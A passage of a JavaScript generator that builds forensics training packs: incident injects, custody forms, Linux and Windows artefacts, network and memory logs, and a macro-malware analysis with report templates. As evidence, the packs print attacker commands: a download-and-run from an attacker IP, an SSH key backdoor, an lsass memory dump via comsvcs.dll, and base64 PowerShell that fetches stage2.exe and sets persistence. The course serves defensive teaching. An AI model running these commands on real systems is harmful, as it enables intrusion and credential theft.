The machine is running. The user is at their desk. Your shift clock starts now.

---

<details>
<summary><strong>INJECT 1 — open at T+10 minutes</strong></summary>

\`\`\`
09:11:47  EDR CROSS-MACHINE QUERY RESULT
Two further hosts have contacted 91[.]92[.]251[.]103 in the last hour:
  FINANCE-PC-11   first contact 08:58:02
  FINANCE-PC-07   first contact 09:04:19

Both are running. Both have the same scheduled task present.
\`\`\`

</details>

---

<details>
<summary><strong>INJECT 2 — open at T+20 minutes</strong></summary>

\`\`\`
09:21:30  SERVICE OWNER, BY PHONE
"FINANCE-PC-04 is the month-end close machine. We need it back in forty
minutes or we miss the reporting deadline. Can you just reboot it?"
\`\`\`

</details>

---

<details>
<summary><strong>INJECT 3 — open at T+30 minutes</strong></summary>

\`\`\`
09:31:08  SIEM
Event ID 4624 on FILESERVER-02, LogonType 3, AuthPkg NTLM,
source FINANCE-PC-11, account svc_finance.

Event ID 4663 on FILESERVER-02: 2,847 file read events in 4 minutes,
path \\\\FILESERVER-02\\Finance\\Payroll\\
\`\`\`

</details>

---

<details>
<summary><strong>INJECT 4 — open at T+40 minutes</strong></summary>

\`\`\`
09:41:55  SIEM
Event ID 1102 on FINANCE-PC-11: the Security log was cleared.
SubjectUserName: svc_finance

Note: events from this host up to 09:41:50 were already forwarded to the
SIEM and are intact.
\`\`\`

</details>

---

<details>
<summary><strong>INJECT 5 — open at T+50 minutes</strong></summary>

\`\`\`
09:52:14  LEGAL COUNSEL, BY EMAIL
"If payroll data was accessed we have a 72-hour regulatory notification
clock. I need to know, today, whether personal data left the environment.
What can you tell me and when?"
\`\`\`

</details>

---

## Evidence inventory — what is available to collect

\`\`\`
FINANCE-PC-04   running, EDR healthy, 16 GB RAM, 512 GB NVMe
FINANCE-PC-11   running, EDR healthy, 16 GB RAM, 512 GB NVMe
FINANCE-PC-07   running, EDR healthy, 16 GB RAM, 512 GB NVMe
FILESERVER-02   running, no EDR agent, Windows Event Log forwarding only

Available tooling (pre-deployed, tested):
  Magnet RAM Capture      memory acquisition
  FTK Imager + Tableau    disk imaging, hardware write blocker
  EDR console             network isolation, process termination
  SIEM                    log export for a given window
\`\`\`

---

## Artefact fragments for the timeline (task T3)

These are out of order on purpose.

\`\`\`
[A] Prefetch: STAGE2.EXE-7F2A41C8.pf, run count 3, last run 09:30:41
[B] Security 4698: task "AdobeUpdateSvc" -> C:\\Users\\Public\\stage2.exe, 08:52:40
[C] Browser download artefact: Q3_Update.xlsm from hxxps://filedrop-eu[.]net, 08:46:55
[D] Sysmon 3: stage2.exe -> 91[.]92[.]251[.]103:443, repeating every 240s from 08:49:02
[E] Security 1102: Security log cleared on FINANCE-PC-11, 09:41:50
[F] Sysmon 1: EXCEL.EXE -> powershell.exe -enc, 08:47:09
[G] Security 4663: 2,847 file reads on \\\\FILESERVER-02\\Finance\\Payroll\\, 09:31:12
[H] Sysmon 11: C:\\Users\\Public\\stage2.exe written, 08:48:44
[I] Security 4624 LogonType 3 NTLM, FINANCE-PC-11 -> FILESERVER-02, 09:31:08
[J] Sysmon 10: stage2.exe opened handle to lsass.exe, GrantedAccess 0x1410, 08:55:17
[K] SRUM: stage2.exe, 1,284,221,440 bytes sent, window 09:32-09:40
[L] Sysmon 1: EXCEL.EXE spawned on FINANCE-PC-11 at 08:57:44 (same document name)
\`\`\`
`,
    ),
  )

  files.push(
    write(
      'incident-response',
      '01-custody-and-report.md',
      `${BANNER(
        'Session 5 — Chain of custody forms and post-incident report template',
        'A custody gap, even a brief and innocent one, is the gap an opposing expert will ask about.',
      )}
## Decision log

Every classification, capture and containment decision, with the real clock
time at which you made it. **The sequence is 30% of the assessment.**

| Real time | Decision | Reason | What this would have changed if done later |
|---|---|---|---|
| | | | |
| | | | |
| | | | |
| | | | |
| | | | |

---

## Severity reassessment record

| Time | Level | What triggered the change |
|---|---|---|
| | P | Initial classification |
| | P | |
| | P | |

---

## Chain of custody — one form per item

\`\`\`
CASE NUMBER     :
ITEM            :                     (identify the physical item, not its role)
COLLECTED BY    :                     (a named person — custody attaches to individuals)
DATE/TIME (UTC) :                     (UTC always; note clock skew separately)
CLOCK SKEW      :                     (system clock vs actual, at collection)
METHOD          :                     (tool AND version)
WRITE BLOCKER   :                     (make/model, or N/A with reason)
HASH (SOURCE)   : sha256
HASH (IMAGE)    : sha256
MATCH?          : ☐ yes  ☐ no -> STOP, document, escalate
STORAGE         :
ACCESS LOG      : ☐ attached

SUBSEQUENT ACCESS
  Date/time     Who            Purpose                 Hash verified?
  ------------  -------------  ----------------------  --------------
\`\`\`

*(Duplicate this block for every item you collect.)*

---

## Forensic timeline

| Time | Fragment | Host | Source | Confidence | Notes |
|---|---|---|---|---|---|
| | | | | obs/hyp/confirmed | |

**Anti-forensic activity identified:**

| What | When | What survived it |
|---|---|---|
| | | |

**Detection opportunities that passed with no alert:**

| Time | What was detectable | Lead time gained if detected |
|---|---|---|
| | | |

---

## Post-incident report

### Executive summary
*Three to five plain-language sentences.*

>

### Root cause
*One specific thing. "Phishing" is a category, not a root cause.*

>

### Evidence and custody position
*Including anything you could not verify.*

>

### Response actions
>

### Recommendations
*Three. Each naming the technique it covers and what it would NOT catch.*

1.
2.
3.

### The question every report must answer

> *If this exact attack happened again tomorrow, would we detect it in the
> first ten minutes?*

**Answer, honestly:**

>
`,
    ),
  )
  return files
}

function session06() {
  const files = []
  files.push(
    write(
      'host-forensics',
      '00-artefact-pack.md',
      `${BANNER(
        'Session 6 — Cross-platform artefact pack',
        'Parsed artefact output from two hosts. Read the Linux integrity results before anything else from that host.',
      )}
# HOST A — Linux web server (web-prd-02, Ubuntu 22.04)

## A1. Binary integrity check — READ THIS FIRST

\`\`\`
$ sudo debsums -c
/usr/bin/ps
/usr/bin/netstat
/usr/bin/ss
\`\`\`

> This Ubuntu host uses Debian packages: \`debsums -c\` lists files whose
> checksums differ from package records. Investigate these differences from
> a trusted examination environment. A mismatch alone does not prove malware,
> and local package metadata is not an independent trusted baseline.

## A2. Authentication log

\`\`\`
$ grep -c "Failed password for root from 185.220.101.45" /var/log/auth.log
847

$ grep "Accepted password for root from 185.220.101.45" /var/log/auth.log
Mar 11 03:14:22 web-prd-02 sshd[28841]: Accepted password for root from 185.220.101.45 port 51224 ssh2

$ stat /var/log/auth.log
  Size: 18234      Modify: 2026-03-11 04:58:11
  (earliest entry in file: Mar 11 02:40:02 — the host has been up 94 days)
\`\`\`

## A3. Shell history

\`\`\`
$ stat /root/.bash_history
  Size: 2847       Modify: 2026-03-11 03:22:14

$ cat /root/.bash_history
whoami
uname -a
cat /etc/os-release
wget hxxp://185[.]220[.]101[.]45/agent.sh
chmod +x agent.sh
./agent.sh
mkdir -p /tmp/.sys
mv agent.sh /tmp/.sys/beacon.sh
crontab -e
awk -F: '$3==0' /etc/passwd
find / -perm -4000 -type f 2>/dev/null
ssh-keygen -t ed25519 -f /tmp/k -N ''
cat /tmp/k.pub >> /root/.ssh/authorized_keys
ssh administrator@10.0.0.44
history -c
\`\`\`

## A4. Persistence

\`\`\`
$ crontab -u root -l
*/5 * * * * /tmp/.sys/beacon.sh

$ find /etc/systemd/system/ -newer /etc/passwd
(no results)

$ find / -name authorized_keys -newer /etc/passwd 2>/dev/null
/root/.ssh/authorized_keys

$ cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQ...  admin@corp-jump-01      # pre-existing, Jan 2026
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...                        # added 2026-03-11 03:19
\`\`\`

## A5. Candidate pivot evidence

\`\`\`
$ cat /root/.ssh/known_hosts
corp-jump-01,10.0.0.9 ssh-rsa AAAAB3NzaC1yc2E...
10.0.0.44 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...
\`\`\`

## A6. Privilege

\`\`\`
$ awk -F: '$3==0' /etc/passwd
root:x:0:0:root:/root:/bin/bash
syslogd:x:0:0:system logging:/var/log:/bin/bash     <-- added 2026-03-11

$ find / -perm -4000 -type f 2>/dev/null | diff - /opt/baseline/suid-baseline.txt
> /usr/bin/find
\`\`\`

---

# HOST B — Windows finance workstation (FIN-WS-22, Windows 11 23H2)

> EDR agent was found **disabled**. Service stop time: 2026-03-11 04:02.
> Windows Event Log forwarding to the SIEM remained active throughout.

## B1. Prefetch (PECmd output, abridged)

\`\`\`
Executable                      RunCount  LastRun              SourcePath
------------------------------  --------  -------------------  ---------------------------
MIMIKATZ.EXE-3BA912C2.pf               2  2026-03-11 04:17:08  C:\\Users\\Public\\
PSEXEC.EXE-A4F12DE3.pf                 1  2026-03-11 04:21:33  C:\\Users\\Public\\
ROBOCOPY.EXE-9C33A1B7.pf               4  2026-03-11 04:55:12  C:\\Windows\\System32\\
CMD.EXE-4A81D33F.pf                   38  2026-03-11 04:21:30  C:\\Windows\\System32\\
EXCEL.EXE-D771C2A9.pf                 61  2026-03-11 09:12:44  C:\\Program Files\\...
CHROME.EXE-2B8F1E04.pf               412  2026-03-11 09:40:02  C:\\Program Files\\...

NOTE: MIMIKATZ.EXE and PSEXEC.EXE do not exist on disk.
\`\`\`

## B2. Persistence (Autoruns output, abridged)

\`\`\`
LOCATION                 ENTRY                      IMAGE PATH
-----------------------  -------------------------  --------------------------------------
Scheduled Tasks          WindowsDefenderHealth      C:\\Users\\Public\\svchost32.exe
Scheduled Tasks          GoogleUpdateTaskMachine    C:\\Program Files (x86)\\Google\\...
HKLM\\...\\Run             SecurityHealth             C:\\Windows\\System32\\SecurityHealth...
HKCU\\...\\Run             OneDrive                   C:\\Users\\...\\OneDrive\\OneDrive.exe
Services                 Winmgmt                    C:\\Windows\\System32\\svchost.exe
WMI Subscriptions        (none found)
\`\`\`

## B3. Registry — user activity (RegRipper output, abridged)

\`\`\`
SHELLBAGS (USRCLASS.DAT)
  C:\\Users\\CFO\\Documents\\                           last accessed 2026-03-11 04:33
  C:\\Users\\CFO\\Documents\\Q1_Financial_Reports\\      last accessed 2026-03-11 04:35
  C:\\Users\\Public\\                                  last accessed 2026-03-11 04:16

RECENTDOCS
  Q1_Board_Pack.pdf          2026-03-11 04:36
  Q1_Revenue_Model.xlsx      2026-03-11 04:37
  (12 further .pdf entries, all 2026-03-11 04:36-04:41)

USERASSIT (ROT13 decoded)
  C:\\Users\\Public\\svchost32.exe    run count 3
\`\`\`

## B4. SRUM (per-application network bytes)

\`\`\`
APPLICATION        BYTES SENT      BYTES RECEIVED  WINDOW
-----------------  --------------  --------------  -------------------
robocopy.exe        2,471,829,504          18,220  2026-03-11 04:40-04:55
chrome.exe            142,880,221   1,904,228,101  2026-03-11 08:00-17:00
svchost32.exe           1,204,882       4,220,118  2026-03-11 04:02-04:58
OUTLOOK.EXE            22,104,882     188,220,004  2026-03-11 08:00-17:00
\`\`\`

## B5. Event log (EvtxECmd output, abridged)

\`\`\`
2026-03-11 04:12:07  4624  LogonType=3  AuthPkg=NTLM  user=administrator  source=10.0.0.9
2026-03-11 04:12:09  4672  SeDebugPrivilege SeBackupPrivilege  user=administrator
2026-03-11 04:21:30  4648  Explicit credentials  target=FILESERVER-01  user=administrator
2026-03-11 04:21:33  7045  New service: PSEXESVC  ImagePath=C:\\Windows\\PSEXESVC.exe
2026-03-11 04:58:22  1102  Security log cleared  user=administrator

NOTE: events up to 04:58:20 were forwarded to the SIEM before the clear and
are intact in the SIEM. The local log begins at 04:58:22.
\`\`\`
`,
    ),
  )
  files.push(
    write(
      'host-forensics',
      '01-timeline-template.md',
      `${BANNER('Session 6 — Cross-platform timeline template', 'One timeline, two hosts, one intrusion.')}
## Linux integrity assessment — complete this FIRST

| Binary | Status | What this means for the rest of the Linux evidence |
|---|---|---|
| | | |

**What can be trusted from this host:**

>

**What cannot:**

>

---

## Cross-platform timeline

| Time | Host | Artefact | What it proves | ATT&CK | Confidence |
|---|---|---|---|---|---|
| | | | | | obs/hyp/confirmed |

---

## Persistence inventory

| Host | Mechanism | Location | Survives a password reset? |
|---|---|---|---|
| | | | ☐ yes ☐ no |
| | | | ☐ yes ☐ no |
| | | | ☐ yes ☐ no |
| | | | ☐ yes ☐ no |

---

## The pivot

| Artefact that links the hosts | What it proves | Corroborating evidence on the destination |
|---|---|---|
| | | |

---

## Anti-forensics

| Act | Host | What survived it |
|---|---|---|
| | | |

---

## Finding

**Finding:**

**Severity:**

**Impact:**

**Evidence:** *(cite the artefact for every claim — be precise about what was
navigated versus what was transferred)*

**Remediation:** *(include the two steps this investigation shows are
commonly missed)*
`,
    ),
  )
  return files
}

function session07() {
  const files = []

  // Beacon connections with light jitter.
  const beacon = []
  let t = 21 * 3600 + 5 * 60
  for (let i = 0; i < 48; i++) {
    const h = Math.floor(t / 3600) % 24
    const m = Math.floor((t % 3600) / 60)
    const s = t % 60
    beacon.push(
      `${hhmmss(h, m, s)}  10.0.3.22:${int(49152, 65535)} -> 91[.]92[.]251[.]103:443  ${int(176, 188)} bytes out / ${int(86, 94)} bytes in  TLS1.2`,
    )
    t += 240 + int(-9, 9)
  }

  const dga = []
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
  const tlds = ['com', 'net', 'org', 'info']
  for (let i = 0; i < 200; i++) {
    let d = ''
    for (let j = 0; j < 10; j++) d += chars[Math.floor(rnd() * chars.length)]
    dga.push(`15:0${int(0, 2)}:${pad(int(0, 59))}  10.0.3.22  QUERY  ${d}[.]${pick(tlds)}  ->  NXDOMAIN`)
  }
  dga.sort()

  files.push(
    write(
      'network-memory-forensics',
      '00-three-layer-pack.md',
      `${BANNER(
        'Session 7 — Three-layer pack',
        'DNS log, PCAP conversation and timing summaries, and parsed Volatility output. Open the DNS log first.',
      )}
## LAYER 1 — DNS query log (WORKSTATION-07, 10.0.3.22, 12 hours)

### 1a. NXDOMAIN responses by hour

\`\`\`
HOUR    NXDOMAIN COUNT    NOTE
-----   ---------------   --------------------------------
15:00               200   <-- anomalous
16:00                 1   baseline
17:00                 0   baseline
18:00                 2   baseline
19:00                 1   baseline
20:00                 3   baseline
21:00                 1   baseline
22:00                 1   baseline
23:00                 0   baseline
00:00                 2   baseline
01:00                 1   baseline
02:00                 0   baseline
\`\`\`

### 1b. The 15:00 window (abridged — 40 of 200 shown)

\`\`\`
${dga.slice(0, 40).join('\n')}
... 160 further NXDOMAIN responses in this window ...
15:03:18  10.0.3.22  QUERY  update-cdn-srv[.]com  ->  A  91[.]92[.]251[.]103
\`\`\`

> One query in this window resolved. Note the time, and note what time the
> beacon starts in layer 2. The gap between them is the single most important
> number in your report.

---

## LAYER 2 — PCAP summaries

These are exports of what Wireshark's **Statistics -> Conversations** and
**IO Graph** views would show you. Opening a raw capture is a tooling
exercise; the inference is the same either way.

### 2a. Selected conversation summaries (not sorted)

\`\`\`
ADDRESS A      ADDRESS B                PACKETS   BYTES A->B   BYTES B->A   DURATION
10.0.3.22      91[.]92[.]251[.]103          192        8,704        4,320   3h 08m
10.0.3.22      10.0.0.15 (FILESERVER-01)  4,218      412,880    8,221,044   22m
10.0.3.22      10.0.0.5  (DC-01)            882       88,204      142,009   14m
10.0.3.22      91[.]92[.]251[.]103        1,204  888,201,448        8,112   13m
10.0.3.22      cdn.contoso.com            2,044      182,004    4,882,110   6h
\`\`\`

### 2b. Connection timing to 91[.]92[.]251[.]103:443

\`\`\`
${beacon.join('\n')}
\`\`\`

### 2c. User traffic baseline from the same host, same duration

\`\`\`
Destinations contacted      : 64
Connection count            : 2,044
Payload size range          : 210 bytes - 3.9 MB
Interval between connections: 1s - 2,610s, no central value
Activity 00:00-06:00        : 2% of daytime volume
\`\`\`

### 2d. POST requests

\`\`\`
02:47:11  10.0.3.22 -> 91[.]92[.]251[.]103  POST /upload
          Content-Type: application/octet-stream
          Content-Length: 888,201,448    (847 MB)
\`\`\`

### 2e. Internal traffic

\`\`\`
01:30:14  10.0.3.22 -> 10.0.0.15:445   SMB2  NEGOTIATE/SESSION_SETUP/TREE_CONNECT  \\\\FILESERVER-01\\Finance$
01:30:22  10.0.3.22 -> 10.0.0.15:445   SMB2  CREATE/READ x 2,104
01:44:08  10.0.3.22 -> 10.0.0.5:445    SMB2  NEGOTIATE/SESSION_SETUP  \\\\DC-01\\SYSVOL
01:44:51  10.0.3.22 -> 10.0.0.5:389    LDAP  searchRequest objectClass=user
\`\`\`

---

## LAYER 3 — Memory (Volatility output, captured 03:12 BEFORE isolation)

### 3a. imageinfo
\`\`\`
Suggested profile : Win10x64_19041
Image date (UTC)  : 2026-03-12 03:12:44
\`\`\`

### 3b. pstree (abridged)
\`\`\`
 PID    PPID   NAME
 4       0     System
 572     4     smss.exe
 684     676   csrss.exe
 768     676   wininit.exe
 820     768   services.exe
 1244    820   svchost.exe
 2344    1180  explorer.exe
. 4102   2344  powershell.exe        <-- unusual child
.. 4188  4102  cmd.exe
 3012    2344  chrome.exe
 5120    2344  OUTLOOK.EXE
\`\`\`

### 3c. malfind (abridged)

Additional supplied validation: PID2344 has a private, unbacked region with a valid PE structure. The chrome and OUTLOOK regions below have been attributed to their legitimate runtimes. Real investigations require these checks; MZ or writable executable memory alone does not prove injection.
\`\`\`
Process: explorer.exe   Pid: 2344   Address: 0x7ff000200000
Vad Tag: VadS   Protection: PAGE_EXECUTE_READWRITE
0x7ff000200000  4d 5a 90 00 03 00 00 00  MZ......

Process: chrome.exe     Pid: 3012   Address: 0x1f2a04c0000
Vad Tag: VadS   Protection: PAGE_EXECUTE_READWRITE
0x1f2a04c0000   48 8b c4 48 89 58 08 48  H..H.X.H
  (no MZ header — V8 JIT region)

Process: OUTLOOK.EXE    Pid: 5120   Address: 0x2004a110000
Vad Tag: VadS   Protection: PAGE_EXECUTE_READWRITE
0x2004a110000   55 8b ec 83 ec 20 53 56  U.... SV
  (no MZ header — .NET JIT region)
\`\`\`

### 3d. netscan (abridged)
\`\`\`
Proto  Local Address        Foreign Address              State        PID   Owner
TCPv4  10.0.3.22:51204      91[.]92[.]251[.]103:443      ESTABLISHED  2344  explorer.exe
TCPv4  10.0.3.22:49881      10.0.0.15:445                CLOSE_WAIT   2344  explorer.exe
TCPv4  10.0.3.22:50112      142.250.185.78:443           ESTABLISHED  3012  chrome.exe
TCPv4  10.0.3.22:50330      52.98.151.2:443              ESTABLISHED  5120  OUTLOOK.EXE
\`\`\`

### 3e. cmdline (abridged)
\`\`\`
explorer.exe     pid 2344  C:\\Windows\\explorer.exe
powershell.exe   pid 4102  powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
cmd.exe          pid 4188  cmd /c rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 724 C:\\Users\\Public\\d.bin full
chrome.exe       pid 3012  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
\`\`\`

---

## Note on the disk layer

Disk forensics on this host was completed yesterday and reported nothing
suspicious. That report was not wrong — it was answering a different question.
Part of task T5 is explaining which question.
`,
    ),
  )

  files.push(
    write(
      'network-memory-forensics',
      '01-timeline-template.md',
      `${BANNER('Session 7 — Multi-layer timeline template', 'Three lanes. The gaps between them are the finding.')}
## T1 — Beacon statistics

| Measure | Value | Working |
|---|---|---|
| Destination | | |
| Connection count | | |
| Mean interval | | |
| Standard deviation | | |
| Jitter estimate (sd/mean) | | |
| Payload size range | | |

**Compared against the user baseline:**

>

---

## T2 — DNS

| Measure | Value |
|---|---|
| DGA window | |
| NXDOMAIN count in that window | |
| Domain that resolved | |
| Address it resolved to | |
| Time the beacon started | |
| **Detection lead time a DNS alert would have given** | **____ hours** |

---

## T3 — Memory

| Process | PID | PAGE_EXECUTE_READWRITE? | MZ header? | Interpretation and supporting checks | Network connection? |
|---|---|---|---|---|---|
| | | | | | |
| | | | | | |
| | | | | | |

**Decoded command:**

>

---

## T4 — Exfiltration and lateral movement

| Measure | Value |
|---|---|
| Largest outbound transfer | |
| Time | |
| Destination | |
| Content-Type | |
| Same destination as the beacon? | |

| Internal host contacted | Port | Time | Before or after exfiltration? |
|---|---|---|---|
| | | | |

---

## T5 — Three-lane timeline

| Time | Network | Memory | Endpoint |
|---|---|---|---|
| | | | |

---

## Missed detections, ordered by lead time

| # | What was detectable | When | Lead time | Rule that would catch it (data source + condition + threshold) |
|---|---|---|---|---|
| 1 | | | | |
| 2 | | | | |
| 3 | | | | |

---

## Finding

**Finding:**
**Severity:**
**Impact:**
**Evidence:**
**Remediation:** *(the missed detection list goes here, ordered)*
`,
    ),
  )
  return files
}

function session08() {
  const files = []
  files.push(
    write(
      'malware-analysis',
      '00-sample-pack.md',
      `${BANNER(
        'Session 8 — Sample pack',
        'Static output, olevba output, a full sandbox report, and pre-answered enrichment. NO EXECUTABLE SAMPLE IS DISTRIBUTED.',
      )}
## Why there is no sample in this pack

Live malware is not distributed to a classroom. What you have is the output a
real analysis would produce, and what is assessed is the interpretation and
the sequencing — which is the part that transfers. Building an isolated
analysis VM is genuinely worth doing and is a separate exercise; the session
recap links FLARE VM and REMnux.

---

## 1. Static triage output

### 1a. File identification
\`\`\`
$ file invoice_march2026.doc
invoice_march2026.doc: Composite Document File V2 Document, Little Endian,
Os: Windows, Version 10.0, Code page: 1252

$ xxd invoice_march2026.doc | head -2
00000000: d0cf 11e0 a1b1 1ae1 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 3e00 0300 feff 0900  ........>.......
\`\`\`

### 1b. Hashes
\`\`\`
SHA256  a3f8c2d1e9b74c05f1882a44ce0b1127d94e71a5c8830f21b4e9a0cc71f3d284
MD5     7c4a8d09ca3762af61e59520943dc264
Size    412,672 bytes
\`\`\`

### 1c. Reputation (VirusTotal, hash submitted — not the file)
\`\`\`
Detection ratio : 0 / 72
First seen      : 2026-03-11 (recent analysis)
Related samples : none
Network IOCs    : none
\`\`\`

### 1d. Strings (filtered)
\`\`\`
$ strings invoice_march2026.doc | grep -Ei "http|cmd|powershell|\\.exe|HKCU"
Microsoft Office Word
ThisDocument
AutoOpen
VBAProject
\`\`\`
> The strings output is almost empty. Note which olevba flag below predicts
> this, and explain the connection in your report.

---

## 2. olevba output

\`\`\`
olevba 0.60.1 on Python 3.11

FILE: invoice_march2026.doc
Type: OLE

-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: invoice_march2026.doc - OLE stream: 'Macros/VBA/ThisDocument'
-------------------------------------------------------------------------------

+------------+----------------------+-----------------------------------------+
| Type       | Keyword              | Description                             |
+------------+----------------------+-----------------------------------------+
| AutoExec   | AutoOpen             | Runs when the Word document is opened   |
| AutoExec   | Document_Open        | Runs when the Word document is opened   |
| Suspicious | Shell                | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | WScript.Shell        | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | URLDownloadToFile    | May download files from the Internet    |
| Suspicious | Chr                  | May attempt to obfuscate specific       |
|            |                      | strings (use option --deobf to attempt  |
|            |                      | deobfuscation)                          |
| Suspicious | Base64 Strings       | Base64-encoded strings were detected    |
| IOC        | hxxp://91[.]92[.]251[.]103/stage2.exe | URL                    |
| IOC        | stage2.exe           | Executable file name                    |
+------------+----------------------+-----------------------------------------+

EXTRACTED COMMAND:
  Shell "cmd.exe /c powershell -nop -w hidden -enc " & payload, vbHide

EXTRACTED BASE64 (payload):
  SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUA
  bgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwA5ADEA
  LgA5ADIALgAyADUAMQAuADEAMAAzAC8AcwB0AGEAZwBlADIALgBlAHgAZQAnACwAJwBDADoA
  XABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHMAdABhAGcAZQAyAC4AZQB4AGUAJwApAA==

SECOND BASE64 STRING (found in a separate function):
  cwBjAGgAdABhAHMAawBzACAALwBjAHIAZQBhAHQAZQAgAC8AdABuACAAIgBXAGkAbgBkAG8A
  dwBzAFUAcABkAGEAdABlAEgAZQBsAHAAZQByACIAIAAvAHQAcgAgAEMAOgBcAFUAcwBlAHIA
  cwBcAFAAdQBiAGwAaQBjAFwAcwB0AGEAZwBlADIALgBlAHgAZQAgAC8AcwBjACAAbwBuAGwA
  bwBnAG8AbgA=
\`\`\`

> Decode **both** base64 strings. There is more than one.

---

## 3. Sandbox report (Any.run, interactive, 300s)

### 3a. Process tree
\`\`\`
WINWORD.EXE (2104)
└─ cmd.exe (2288)  "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgA..."
   └─ powershell.exe (2341)
      ├─ stage2.exe (2510)        C:\\Users\\Public\\stage2.exe
      │  └─ [injected into] explorer.exe (1844)
      └─ schtasks.exe (2560)      /create /tn "WindowsUpdateHelper" ...
\`\`\`

### 3b. Network activity
\`\`\`
TIME     PROTO  DESTINATION                      DETAIL
00:04    DNS    (none — direct IP)
00:04    HTTP   91[.]92[.]251[.]103:80           GET /stage2.exe  200  184,320 bytes
00:31    DNS    update-srv-cdn[.]com             -> 91[.]92[.]251[.]103
00:32    TLS    91[.]92[.]251[.]103:443          beacon, 240s interval, 180 bytes out
04:32    TLS    91[.]92[.]251[.]103:443          beacon
\`\`\`

### 3c. Files created
\`\`\`
PATH                                      SHA256
C:\\Users\\Public\\stage2.exe                e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
C:\\Users\\Public\\d.bin                     (varies per run — memory dump output)
%TEMP%\\~WRD0001.tmp                        (Word temporary file, benign)
\`\`\`

### 3d. Registry changes
\`\`\`
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateHelper
  = C:\\Users\\Public\\stage2.exe
\`\`\`

### 3e. Persistence
\`\`\`
Scheduled task : WindowsUpdateHelper -> C:\\Users\\Public\\stage2.exe, trigger onlogon
Registry Run   : HKCU\\...\\Run\\WindowsUpdateHelper
Mutex          : Global\\{3F2504E0-4F89-11D3-9A0C-0305E82C3301}
\`\`\`

### 3f. Sandbox ATT&CK mapping
\`\`\`
T1204.002  User Execution: Malicious File
T1059.001  Command and Scripting Interpreter: PowerShell
T1105      Ingress Tool Transfer
T1053.005  Scheduled Task/Job
T1547.001  Registry Run Keys
T1055      Process Injection
T1071.001  Application Layer Protocol: Web Protocols
\`\`\`

---

## 4. Enrichment file (pre-answered lookups)

### 4a. VirusTotal — 91[.]92[.]251[.]103
\`\`\`
Detections        : 18 / 94 security vendors flag this address
Communicating     : 4 samples
  e3b0c442...     Trojan.CobaltStrike        first seen 2026-03-09
  7d9f2a11...     Trojan.CobaltStrike        first seen 2026-03-10
  2c4e8b90...     (undetected)               first seen 2026-03-11
  a3f8c2d1...     (undetected)               THIS SAMPLE
Resolutions       : update-srv-cdn[.]com, ms-update-service[.]com, update-cdn-srv[.]com
\`\`\`

### 4b. Shodan — 91[.]92[.]251[.]103
\`\`\`
Open ports   : 22, 80, 443
443 banner   : nginx
JARM         : 07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1
               (JARM associated with Cobalt Strike team servers)
Hosting      : VPS provider, Bucharest, RO
ASN          : AS200000 (example)
\`\`\`

### 4c. WHOIS — update-srv-cdn[.]com
\`\`\`
Registered  : 2026-03-09
Registrar   : (privacy-protected)
\`\`\`

### 4d. crt.sh — certificate shared by update-srv-cdn[.]com
\`\`\`
DOMAIN                        FIRST SEEN   RESOLVES TO              NOTE
update-srv-cdn[.]com          2026-03-09   91[.]92[.]251[.]103
ms-update-service[.]com       2026-03-09   91[.]92[.]251[.]103
update-cdn-srv[.]com          2026-03-09   91[.]92[.]251[.]103
win-telemetry-cdn[.]net       2026-03-10   91[.]92[.]251[.]103
office-licence-check[.]com    2026-03-10   91[.]92[.]251[.]103
cdn.cloudflare-static.net     2019-04-02   104.16.0.0/12            large CDN, 8 years old
static.fastly-edge.net        2018-11-20   151.101.0.0/16           large CDN, 7 years old
\`\`\`

> Seven domains share this certificate. Not all seven are campaign
> infrastructure. Validating each one before recommending a block is task T4,
> and it is 20% of the assessment.
`,
    ),
  )

  files.push(
    write(
      'malware-analysis',
      '01-report-template.md',
      `${BANNER('Session 8 — Malware investigation report template', 'Seven sections. The IOC list must be pasteable without editing.')}
## Section 1 — Executive summary

*Two to three sentences the CISO can repeat verbatim in a board meeting.*

>

---

## Section 2 — Sample information

| Field | Value |
|---|---|
| Filename | |
| True file type (from magic bytes) | |
| Extension matches format? | |
| File size | |
| SHA256 | |
| MD5 | |
| First seen | |
| Detection ratio | |
| **Interpretation of that ratio** | |

---

## Section 3 — Static analysis findings

| Finding | Evidence |
|---|---|
| | |

**Decoded commands:**

| Encoded (truncated) | Decoded | ATT&CK |
|---|---|---|
| | | |
| | | |

**What static analysis could not see, and which olevba flag predicted it:**

>

---

## Section 4 — Behavioural analysis findings

**Execution chain:**

\`\`\`

\`\`\`

| Dropped file | Path | Hash |
|---|---|---|
| | | |

| Persistence mechanism | Location |
|---|---|
| | |

---

## Section 5 — IOC list

\`\`\`
# Confidence:  [C] confirmed campaign  [P] probable  [V] requires validation
# Do NOT recommend blocking anything marked [V].

FILE HASHES
  [ ] SHA256:
  [ ] MD5:
  [ ] SHA256:   (dropped file)

NETWORK
  [ ]
  [ ]

DOMAINS
  [ ]
  [ ]
  [ ]

HOST INDICATORS
  [ ] Dropped file path:
  [ ] Registry key:
  [ ] Scheduled task:
  [ ] Mutex:
\`\`\`

**Validation notes for anything marked [V]:**

| Domain | Why it is uncertain | What would resolve it |
|---|---|---|
| | | |

---

## Section 6 — MITRE ATT&CK mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| | | | |

---

## Section 7 — Recommendations

### Detection rules, one per stage

| Stage | Data source | Condition | What it would NOT catch |
|---|---|---|---|
| Delivery | | | |
